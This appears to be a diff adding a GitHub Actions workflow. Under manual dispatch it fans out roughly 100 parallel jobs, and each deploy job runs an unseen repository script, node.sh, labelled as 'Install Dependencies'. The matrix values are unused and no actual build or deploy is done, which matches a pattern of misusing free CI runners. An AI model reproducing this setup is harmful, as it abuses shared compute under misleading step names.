@@ -1,0 +1,93 @@
+name: build
+on:
+  workflow_dispatch:
+ 
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5]
+        flag: [A, B, C, D]
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup
+      continue-on-error: true
+      uses: actions/checkout@v1
+ 
+  deploy-1:
+    name: deploy-1
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name : Install Dependencies
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && "${GITHUB_WORKSPACE}/node.sh"
+ 
+  deploy-2:
+    name: deploy-2
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name : Install Dependencies
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && "${GITHUB_WORKSPACE}/node.sh"
+ 
+  deploy-3:
+    name: deploy-3
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name : Install Dependencies
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && "${GITHUB_WORKSPACE}/node.sh"
+ 
+  deploy-4:
+    name: deploy-4
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name : Install Dependencies
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && "${GITHUB_WORKSPACE}/node.sh"
